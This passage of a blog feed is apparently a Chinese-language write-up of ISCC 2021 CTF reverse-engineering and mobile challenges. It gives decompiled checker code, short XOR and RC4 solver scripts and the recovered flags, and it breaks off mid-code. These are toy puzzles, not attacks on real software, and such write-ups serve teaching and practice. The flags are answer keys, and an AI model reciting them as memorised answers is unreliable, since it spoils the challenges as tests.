c53dd87a9be615685deaed7d02822d3ae9f656e897f86e4910e2eca5f55bceea68b3204bb26543fb8b2b2d6f558c48db0460aba453617b58763d142ed774d6e0cc9a2b850d44cf719201e88be5a70562e39aeed9e22262f2f7cd474524044df159969a3e249ef60e7472ea5c4466e6fbe335ba51c6b11b43476f80e5d0e2b1f6bf02af6791381cc8a1314860a012968c42fba36b9ecdf672cdea808df6b544f562b0c9369398659fb568b8215999b2465a180e73b126767b6eedbdf5836ffc06ad7c4057996dc1e819d65a31d79fd14a30ad6f6ed69b42d6565dc439cbdbbb7a367f10ffe423666d3384e929d9ed84d36a4c13621a5dd81373e4797d4b01abb706acbf3301a7ab4c0a0cbb493250255ea594b86a2a9a09c88fbab5a40c214612f8380745a91b171c442c5d52ee7988aa78e24fce66083fe5093123aa676f4205afee303003f18245ef27f247c986791578086c8dfa0d68a38f77733bede4bff931968527b32dc4c095909a8896c114e7eab6ee17e6a310123a4ddbfa3c98468991c338237a24e3cd1c3cac5f84c6ec79986e4130efc3b8c81d7b21c5eb38a4f73511e7db750f25a3b3c998026c14ce0af1c0fbbe11cb23df4a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-知识点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC-2021</title>
      <link href="2021/05/01/ISCC-2021/"/>
      <url>2021/05/01/ISCC-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Garden"><a href="#Garden" class="headerlink" title="Garden"></a>Garden</h2><a id="more"></a><p>逆向签到题，一道python逆向。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python 2.7 (62211)</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line"># Compiled at: 2021-02-27 22:29:29</span><br><span class="line">#Powered by BugScaner</span><br><span class="line">import platform, sys, marshal, types</span><br><span class="line"> </span><br><span class="line">def check(s):</span><br><span class="line">    f &#x3D; &#39;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#39;</span><br><span class="line">    if len(s) !&#x3D; len(f):</span><br><span class="line">        return False</span><br><span class="line">    checksum &#x3D; 0</span><br><span class="line">    for a, b in zip(f, s):</span><br><span class="line">        checksum +&#x3D; ord(b) ^ ord(a) ^ 123</span><br><span class="line"> </span><br><span class="line">    return checksum &#x3D;&#x3D; 0</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if sys.version_info.major !&#x3D; 2 or sys.version_info.minor !&#x3D; 7:</span><br><span class="line">    sys.exit(&#39;\xe8\xaf\x95\xe8\xaf\x95 Python 2.7.&#39;)</span><br><span class="line">if len(sys.argv) !&#x3D; 2:</span><br><span class="line">    sys.exit(&#39;usage: bronze.pyc &lt;flag&gt;&#39;)</span><br><span class="line">flag &#x3D; sys.argv[1]</span><br><span class="line">if len(flag) &gt;&#x3D; 32:</span><br><span class="line">    print &#39;\xe5\xa4\xaa\xe9\x95\xbf\xe4\xba\x86.&#39;</span><br><span class="line">    sys.exit(1)</span><br><span class="line">alphabet &#x3D; set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+&#39;)</span><br><span class="line">for ch in flag:</span><br><span class="line">    if ch not in alphabet:</span><br><span class="line">        print &#39;\xe4\xb8\x8d\xe5\xaf\xb9.&#39;</span><br><span class="line">        sys.exit(1)</span><br><span class="line"> </span><br><span class="line">if check(flag):</span><br><span class="line">    print &#39;\xe5\xb0\xb1\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaa!&#39;</span><br><span class="line">    sys.exit(0)</span><br><span class="line">else:</span><br><span class="line">    print &#39;\xe6\x90\x9e\xe9\x94\x99\xe4\xba\x86.&#39;</span><br><span class="line">    sys.exit(1)&lt;&#x2F;flag&gt;</span><br></pre></td></tr></table></figure><p>逻辑很简单，就是让checksum=0，即 0=ord(b) ^ ord(a) ^ 123，转换一下，flag[i]=0^f[i]^123</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f &#x3D; &#39;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#39;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in f:</span><br><span class="line">    flag+&#x3D;chr(0^123^ord(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{Makka2021Pakka}</p></blockquote><h2 id="汇编大人，时代变了"><a href="#汇编大人，时代变了" class="headerlink" title="汇编大人，时代变了"></a>汇编大人，时代变了</h2><p>这一题给了一个task.ll文件，打开百度后知道是LLVM IR。<br>使用LLVM-Clang编译器将task.ll文件转为可执行文件.<br>之后拖入ida中快乐F5.</p><blockquote><p>main函数</p></blockquote><p><img src="/2021/05/01/ISCC-2021/1.PNG"></p><blockquote><p>check</p></blockquote><p><img src="/2021/05/01/ISCC-2021/2.PNG"></p><p>根据最上面的两句话可猜出，check返回值恒为一或恒为零，然后我先试了else那条路，得到了一个假的falg：___7h15_15_4_f4k3_f14g_y0u_w1ll_f41l_1f_y0u_subm17_17___。<br>可以确定flag在if那条路中，根据check函数即可写出解题脚本，这里我使用了爆破.</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int what[]&#x3D;&#123;0x64, 0x4E, 0x6C, 0x2E, 0x1E, 0x36, 0x38, 0x04, 0x44, 0x12, 0x1C, 0x24, 0x5C, 0x59, 0x3D, 0x0B, 0x5A, 0x78, 0x08, 0x09, 0x76, 0x70, 0x79, 0x33, 0x13, 0x16, 0x20, 0x7E, 0x6B, 0x23, 0x36, 0x45, 0x07, 0x11, 0x2C, 0x22, 0x4A, 0x4A, 0x4F, 0x2E, 0x48, 0x4C, 0x7C, 0x3E, 0x11, 0x0F, 0x6A, 0x18, 0x37, 0x42, 0x1E, 0x2B, 0x12, 0x03, 0x5A, 0x47&#125;;</span><br><span class="line">int secret[]&#x3D;&#123;0x42, 0x0A, 0x7C, 0x5F, 0x22, 0x06, 0x1B, 0x67, 0x37, 0x23, 0x5C, 0x46, 0x0A, 0x29, 0x09, 0x30, 0x51, 0x38, 0x5F, 0x7B, 0x59, 0x13, 0x18, 0x0D, 0x50&#125;;</span><br><span class="line">  int flag[56];</span><br><span class="line">  int i,j;</span><br><span class="line">  for(j&#x3D;32;j&lt;127;j++)</span><br><span class="line">  &#123;</span><br><span class="line">  flag[0]&#x3D;j;</span><br><span class="line">  for(i&#x3D;0;i&lt;56;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  if(i&lt;55)</span><br><span class="line">  flag[i+1]&#x3D;flag[i]^what[i];</span><br><span class="line">  flag[i] &#x3D; flag[i] ^ secret[i % 25];</span><br><span class="line">  printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">  printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/01/ISCC-2021/3.PNG"></p><blockquote><p>ISCC{mAy6e_t0d4Y_7H15_ls_tH3_10n8est_f14g_Y0_HaD_Ev3R_5e3n_!_}</p></blockquote><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>本题和题目描述一样，分析就完事了。<br>拖入32ida，直接就看到了main函数，很常规的输入、变换、比较。</p><blockquote><p>main函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char Str[3]; &#x2F;&#x2F; [esp+11h] [ebp-97h] BYREF</span><br><span class="line">  _BYTE v5[57]; &#x2F;&#x2F; [esp+14h] [ebp-94h] BYREF</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+4Dh] [ebp-5Bh]</span><br><span class="line">  char v7[64]; &#x2F;&#x2F; [esp+51h] [ebp-57h] BYREF</span><br><span class="line">  char v8[7]; &#x2F;&#x2F; [esp+91h] [ebp-17h] BYREF</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+98h] [ebp-10h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+9Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  memset(v5, 0, 4 * (((Str - v5 + 64) &amp; 0xFFFFFFFC) &gt;&gt; 2));</span><br><span class="line">  Str[0] &#x3D; 0x43;</span><br><span class="line">  Str[1] &#x3D; 0xDF;</span><br><span class="line">  Str[2] &#x3D; 0x14;</span><br><span class="line">  v5[0] &#x3D; 3;</span><br><span class="line">  v5[1] &#x3D; 13;</span><br><span class="line">  v5[2] &#x3D; 44;</span><br><span class="line">  v5[3] &#x3D; 9;</span><br><span class="line">  v5[4] &#x3D; 1;</span><br><span class="line">  v5[5] &#x3D; 23;</span><br><span class="line">  v5[6] &#x3D; 23;</span><br><span class="line">  v5[7] &#x3D; 8;</span><br><span class="line">  v5[8] &#x3D; -4;</span><br><span class="line">  v5[9] &#x3D; 43;</span><br><span class="line">  v5[10] &#x3D; -6;</span><br><span class="line">  v5[11] &#x3D; 20;</span><br><span class="line">  v5[12] &#x3D; 23;</span><br><span class="line">  v5[13] &#x3D; -7;</span><br><span class="line">  v5[14] &#x3D; 37;</span><br><span class="line">  v5[15] &#x3D; -11;</span><br><span class="line">  v5[16] &#x3D; 34;</span><br><span class="line">  v5[17] &#x3D; 61;</span><br><span class="line">  v5[18] &#x3D; -50;</span><br><span class="line">  v5[19] &#x3D; 0x18;</span><br><span class="line">  v5[20] &#x3D; 0x16;</span><br><span class="line">  v5[21] &#x3D; 0xA;</span><br><span class="line">  qmemcpy(v8, &quot;REVERSE&quot;, sizeof(v8));</span><br><span class="line">  v9 &#x3D; strlen(Str);</span><br><span class="line">  printf(Format);</span><br><span class="line">  scanf(&quot;%s&quot;, v7);</span><br><span class="line">  mix(v7, v8, v9);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v7[i] !&#x3D; Str[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(Buffer);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(aFlag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>mix函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl mix(char *a1, char *Str, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; &#x2F;&#x2F; dl</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  char v5; &#x2F;&#x2F; [esp+14h] [ebp-24h]</span><br><span class="line">  int n; &#x2F;&#x2F; [esp+18h] [ebp-20h]</span><br><span class="line">  int m; &#x2F;&#x2F; [esp+1Ch] [ebp-1Ch]</span><br><span class="line">  int l; &#x2F;&#x2F; [esp+20h] [ebp-18h]</span><br><span class="line">  size_t k; &#x2F;&#x2F; [esp+24h] [ebp-14h]</span><br><span class="line">  int j; &#x2F;&#x2F; [esp+28h] [ebp-10h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; i &lt; a3; ++i )</span><br><span class="line">    a1[i] -&#x3D; 64;</span><br><span class="line">  for ( j &#x3D; 0; j &lt; a3; ++j )</span><br><span class="line">    a1[j] -&#x3D; a1[j + 1];</span><br><span class="line">  for ( k &#x3D; 0; k &lt; strlen(Str); ++k )</span><br><span class="line">    Str[k] %&#x3D; 64;</span><br><span class="line">  for ( l &#x3D; 0; l &lt; a3; ++l )</span><br><span class="line">    a1[l] +&#x3D; Str[l % 7];</span><br><span class="line">  for ( m &#x3D; 0; a3 &#x2F; 2 &gt; m; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; a1[m];</span><br><span class="line">    a1[m] &#x3D; a1[a3 - m - 1];</span><br><span class="line">    a1[a3 - m - 1] &#x3D; v5;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( n &#x3D; 0; ; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; n;</span><br><span class="line">    if ( n &gt;&#x3D; a3 )</span><br><span class="line">      break;</span><br><span class="line">    if ( (Str[n % 7] &amp; 1) !&#x3D; 0 )</span><br><span class="line">      v3 &#x3D; a1[n] + 2;</span><br><span class="line">    else</span><br><span class="line">      v3 &#x3D; a1[n] + 1;</span><br><span class="line">    a1[n] &#x3D; v3;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数中Str和v5的地址是连续的，所以str+v5就是变化后的flag，mix函数也很简单。</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char v3; &#x2F;&#x2F; dl</span><br><span class="line">    int result; &#x2F;&#x2F; eax</span><br><span class="line">    char v5; &#x2F;&#x2F; [esp+14h] [ebp-24h]</span><br><span class="line">    int n; &#x2F;&#x2F; [esp+18h] [ebp-20h]</span><br><span class="line">    int m; &#x2F;&#x2F; [esp+1Ch] [ebp-1Ch]</span><br><span class="line">    int l; &#x2F;&#x2F; [esp+20h] [ebp-18h]</span><br><span class="line">    size_t k; &#x2F;&#x2F; [esp+24h] [ebp-14h]</span><br><span class="line">    int j; &#x2F;&#x2F; [esp+28h] [ebp-10h]</span><br><span class="line">    int i; &#x2F;&#x2F; [esp+2Ch] [ebp-Ch]</span><br><span class="line">    char flag[25]&#x3D;&#123;0x43, 0xdf, 0x14, 3, 0xD, 0x2C, 9, 1, 0x17, 0x17, 8, 0xFC, 0x2B, 0xFA, 0x14, 0x17, 0xF9, 0x25, 0xF5, 0x22, 0x3D, 0xCE, 0x18, 0x16, 0xA&#125;;</span><br><span class="line">    char Str[7] &#x3D; &quot;REVERSE&quot;;</span><br><span class="line">    int a3 &#x3D; 25;</span><br><span class="line">    for ( k &#x3D; 0; k &lt; 7; ++k )</span><br><span class="line">        Str[k] %&#x3D; 64;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 25 ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ( (Str[i % 7] &amp; 1) !&#x3D; 0 )</span><br><span class="line">            flag[i] -&#x3D; 2;</span><br><span class="line">        else</span><br><span class="line">            flag[i] -&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( m &#x3D; 0; a3 &#x2F; 2 &gt; m; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 &#x3D; flag[m];</span><br><span class="line">        flag[m] &#x3D; flag[a3 - m - 1];</span><br><span class="line">        flag[a3 - m - 1] &#x3D; v5;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( l &#x3D; 0; l &lt; a3; ++l )</span><br><span class="line">        flag[l] -&#x3D; Str[l % 7];</span><br><span class="line">    for ( j &#x3D; 24; j &gt;&#x3D; 0; --j )</span><br><span class="line">        flag[j-1] +&#x3D; flag[j];</span><br><span class="line">    for ( i &#x3D; 0; i &lt; a3; ++i )</span><br><span class="line">        flag[i] +&#x3D; 64;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 25; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{REVERSE_IS_NOT_HARD}</p></blockquote><h2 id="Greedy-Snake"><a href="#Greedy-Snake" class="headerlink" title="Greedy Snake"></a>Greedy Snake</h2><p>用Exeinfo PE查看文件信息</p><p><img src="/2021/05/01/ISCC-2021/4.PNG"></p><p>有upx壳，我用upxshell和upx -d都没有脱掉，然后手动脱壳，ida打开，期间又报了几个错误，不过还是反编译出了主要内容。</p><p><img src="/2021/05/01/ISCC-2021/5.PNG"></p><p>base64解密</p><p><img src="/2021/05/01/ISCC-2021/6.PNG"></p><p>当时没看见12行还有个函数，我直接盲猜是异或，然后试出来是和9异或。<br>之后才发现漏了一个函数，不过也懒得看了，flag已经除了，感觉这题全靠运气…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[] &#x3D; &quot;@ZJJrV\\YQ(V&lt;&lt;V&lt;9V&lt;1V&#x3D;gmVK&#x3D;&lt;l\&quot;Q9[t&quot;;</span><br><span class="line">    for (int i &#x3D; 0; i&lt; strlen(str); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        str[i] ^&#x3D;9;</span><br><span class="line">        printf(&quot;%c&quot;, str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{_UPX!_55_50_58_4nd_B45e+X0R}</p></blockquote><h2 id="秘笈"><a href="#秘笈" class="headerlink" title="秘笈"></a>秘笈</h2><h2 id="Ron’s-Code"><a href="#Ron’s-Code" class="headerlink" title="Ron’s Code"></a>Ron’s Code</h2><p>送分题，主要就一个原生的rc4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char T[256]&#x3D;&#123;0&#125;;</span><br><span class="line">    unsigned char S[256];</span><br><span class="line">    int flag[17] &#x3D; &#123;&#39;\xE8&#39;,&#39;0&#39;,&#39;\xE8&#39;,&#39;0&#39;,&#39;\xC9&#39;,&#39;e&#39;,&#39;\xA9&#39;,&#39;\xBA&#39;,&#39;w&#39;,&#39;\xDA&#39;,&#39;\xF4&#39;,&#39;N&#39;,&#39;\xE3&#39;,&#39;\xE9&#39;,&#39;&#96;&#39;,&#39;v&#39;,&#39;\xC1&#39;&#125;;</span><br><span class="line">    int len&#x3D;17;</span><br><span class="line">    char v5[8]&#x3D;&quot;ISCC2021&quot;;</span><br><span class="line">    char key[8];</span><br><span class="line">    int j&#x3D;0;</span><br><span class="line">    int i&#x3D;0;</span><br><span class="line">    int temp;</span><br><span class="line">    for(i&#x3D;0;i&lt;8;i++)</span><br><span class="line">        key[i]&#x3D;v5[i]+i;</span><br><span class="line">    for(i&#x3D;0; i&lt; 256; i++)</span><br><span class="line">    &#123;</span><br><span class="line">            T[i] &#x3D; key[i % 8];</span><br><span class="line">            S[i]&#x3D;i;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0; i&lt;256;i++)</span><br><span class="line">    &#123;</span><br><span class="line">            j &#x3D; (T[i] + j +S[i])%256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">    i &#x3D; j &#x3D; 0;</span><br><span class="line">    int t;</span><br><span class="line">    for(int r&#x3D;0; r&lt;len;r++)</span><br><span class="line">    &#123;</span><br><span class="line">            i &#x3D; (i+1) % 256;</span><br><span class="line">            j &#x3D; (j+S[i]) % 256;</span><br><span class="line">            temp &#x3D; S[i];</span><br><span class="line">            S[i] &#x3D; S[j];</span><br><span class="line">            S[j] &#x3D; temp;</span><br><span class="line">            t &#x3D; (S[j]+S[i]) % 256;</span><br><span class="line">            flag[r]^&#x3D;S[t];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (i &#x3D; 0; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]+&#x3D; v5[i%8];</span><br><span class="line">        flag[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;len;i++)</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ISCC{reverse_rc4}</p></blockquote><h1 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h1><h2 id="Mobile-Easy"><a href="#Mobile-Easy" class="headerlink" title="Mobile Easy"></a>Mobile Easy</h2><p>签到题</p><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.example.mobileeasy;</span><br><span class="line"></span><br><span class="line">import android.app.Activity;</span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br><span class="line"></span><br><span class="line">public class MainActivity extends Activity &#123;</span><br><span class="line">  private boolean getFlag(String paramString) &#123;</span><br><span class="line">    String str &#x3D; first.firstStr(paramString);</span><br><span class="line">    if (str.length() &lt; 15)</span><br><span class="line">      return false; </span><br><span class="line">    if (!str.substring(0, 5).equals(&quot;ISCC&#123;&quot;) || !str.substring(str.length() - 1).equals(&quot;&#125;&quot;))</span><br><span class="line">      return false; </span><br><span class="line">    paramString &#x3D; str.substring(5, 15);</span><br><span class="line">    str &#x3D; str.substring(15, str.length() - 1);</span><br><span class="line">    return !paramString.equals(second.secondStr()) ? false : (!!third.thirdStr(str));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public void onClick(View paramView) &#123;</span><br><span class="line">    if (getFlag(((EditText)findViewById(2131165238)).getText().toString())) &#123;</span><br><span class="line">      Toast.makeText((Context)this, &quot;right&quot;, 0).show();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      Toast.makeText((Context)this, &quot;wrong&quot;, 0).show();</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">    super.onCreate(paramBundle);</span><br><span class="line">    setContentView(2131296284);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span 